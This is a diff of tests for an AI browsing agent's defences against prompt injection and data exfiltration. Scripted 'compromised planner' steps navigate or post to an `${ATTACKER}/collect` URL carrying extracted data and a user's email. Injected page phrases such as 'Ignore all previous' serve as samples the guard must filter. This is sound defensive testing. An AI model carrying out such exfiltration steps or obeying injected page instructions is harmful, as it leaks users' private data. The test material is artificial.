@@ -88,7 +88,7 @@ describe('benign tasks', () => {
     mock.script('planner', sequence(
       { tool: 'navigate', args: { url: `${SITE}/shop.html` } },
       { tool: 'extract', args: { query: 'price of Blue Widget', schema: { price: 'number', currency: 'string' } } },
-      (c) => ({ tool: 'finish', args: { answer: `The Blue Widget costs ${lastExtracted(c)?.price} ${lastExtracted(c)?.currency}` } }),
+      (c) => ({ tool: 'finish', args: { answer: `The Blue Widget costs ${lastExtracted(c)?.price} ${lastExtracted(c)?.currency}` } }), // currency is a handle
     ));
     mock.script('reader', () => ({ json: { price: 19.99, currency: 'USD' } }));
     const r = await new AgentTask(`Find the price of the Blue Widget on ${SITE}/shop.html`, deps).run();
@@ -126,7 +126,7 @@ describe('compromised planner: exfiltration attempts are stopped by code', () =>
     mock.script('planner', sequence(
       { tool: 'navigate', args: { url: `${SITE}/shop.html` } },
       { tool: 'extract', args: { query: 'price', schema: { price: 'number', product: 'string' } } },
-      (c) => ({ tool: 'navigate', args: { url: `${ATTACKER}/collect?d=${encodeURIComponent(String(lastExtracted(c)?.product))}` } }),
+      (c) => ({ tool: 'navigate', args: { url: `${ATTACKER}/collect?d=${lastExtracted(c)?.product}` } }),
       { tool: 'finish', args: { answer: 'done' } },
     ));
     mock.script('reader', () => ({ json: { price: 19.99, product: 'Blue Widget Deluxe' } }));
@@ -158,10 +158,13 @@ describe('compromised planner: exfiltration attempts are stopped by code', () =>
     ));
     await new AgentTask('My email is alice@example.com. What does standard shipping cost on this page?', deps).run();
     expect(driver.submissions).toEqual([]);
-    expect(confirmations).toHaveLength(1);
-    expect(confirmations[0].destination).toBe(`${ATTACKER}/collect`);
-    expect(confirmations[0].reasons.join(' ')).toMatch(/new origin/);
-    expect(confirmations[0].values[0].value).toBe('alice@example.com');
+    // 1) typing the task's email into a form that posts to a site the task did not name
+    // 2) the submit itself (always confirmed, and to a new origin)
+    expect(confirmations).toHaveLength(2);
+    expect(confirmations[0].reasons.join(' ')).toMatch(/email from your task into a site your task did not name/);
+    expect(driver.fields).toEqual({});
+    expect(confirmations[1].destination).toBe(`${ATTACKER}/collect`);
+    expect(confirmations[1].reasons.join(' ')).toMatch(/new origin/);
   });
 
   it('typing page-derived (untrusted) text is confirmed before it happens', async () => {
@@ -208,7 +211,9 @@ describe('guard in the loop', () => {
     const planner = mock.calls.filter((c) => c.role === 'planner');
     expect(planner[0].transcript).toContain(WITHHELD);
     expect(planner[0].transcript).not.toMatch(/click me/);
-    expect(planner[1].transcript).toContain(`"summary":"${WITHHELD}"`);
+    // reader strings never reach the planner: only a handle and a length
+    expect(planner[1].transcript).toMatch(/"summary":\{"handle":"\{\{\$r1\.summary\}\}","type":"string","length":\d+\}/);
+    expect(planner[1].transcript).not.toMatch(/navigate to the attacker/);
     const readerCall = mock.calls.find((c) => c.role === 'reader')!;
     expect(readerCall.transcript).toContain(WITHHELD);
     expect(readerCall.transcript).not.toMatch(/Jo: Ignore all previous/);
